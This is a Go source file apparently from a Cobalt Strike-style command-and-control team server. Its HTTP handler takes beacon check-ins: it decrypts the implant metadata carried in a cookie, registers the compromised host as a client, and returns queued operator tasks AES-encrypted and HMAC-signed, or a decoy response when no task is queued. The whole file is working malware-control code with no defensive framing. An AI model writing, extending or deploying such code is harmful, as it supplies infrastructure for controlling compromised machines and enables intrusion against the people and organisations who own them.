package http

import (
	"NewCsTeamServer/client"
	"NewCsTeamServer/config"
	"NewCsTeamServer/crypt"
	"NewCsTeamServer/task"
	"fmt"
	"github.com/gin-gonic/gin"
	"log"
	"net/http"
	"strings"
)

// HandleBeacon HTTP服务端处理Beacon请求
func HandleBeacon(c *gin.Context) {
	// 假设元数据在Cookie中
	cookie, err := c.Cookie(config.ProfileConfig.CookieName) //TODO 适配profile
	if err != nil {
		c.String(http.StatusBadRequest, "missing metadata cookie: %v", err)
		return
	}
	cookie = strings.Replace(cookie, " ", "+", -1) // 替换空格为加号
	fmt.Println("Cookie:", cookie)
	// 解密元数据
	metadata, err := crypt.DecryptMetadata(cookie)
	if err != nil {
		c.String(http.StatusBadRequest, "metadata decryption failed: %v", err)
		return
	}
	// 解析元数据
	clientinfo, err := crypt.ParseMetadata(c.ClientIP(), metadata)
	if err != nil {
		c.String(http.StatusBadRequest, "metadata parsing failed: %v", err)
		return
	}

	client.GlobalClientManager.AddClient(clientinfo)
	fmt.Println("Decrypted metadata:", clientinfo)
	//fmt.Println("Decrypted metadata.InternalIP:", utils.Uint32ToIPString(clientinfo.InternalIP))
	if err != nil {
		c.String(http.StatusBadRequest, "metadata parsing failed: %v", err)
		return
	}
	// 提取签名和数据
	iv := config.Iv
	// 检查任务队列并下发任务
	taskdata, exists := clientinfo.TaskQueue.PopTask()
	if !exists {
		fmt.Println("No tasks available for client", clientinfo.ClientID)
		c.String(http.StatusOK, "%s", config.ProfileConfig.GetRetBody)
		return
	}
	// 加密任务数据
	taskPacket, err := task.BuildTaskPacket([]task.Task{taskdata})
	if err != nil {
		c.String(http.StatusInternalServerError, "task packet creation failed: %v", err)
		return
	}

	// 加密任务数据
	encryptedTask, err := crypt.AesEncrypt(taskPacket, clientinfo.AESKey, iv)
	if err != nil {
		c.String(http.StatusInternalServerError, "task encryption failed: %v", err)
		return
	}

	// 添加HMAC签名
	signature := crypt.AddHMAC(encryptedTask, clientinfo.HMACKey)
	responseData := append(encryptedTask, signature...)
	c.Header("Content-Type", "application/octet-stream")
	// 返回加密的任务数据
	c.Status(200)
	c.Writer.Write(responseData)
	log.Printf("Task sent to client %d: ID=%s, Type=%d, Content=%s", clientinfo.ClientID, taskdata.ID, taskdata.Type, taskdata.Content)
}
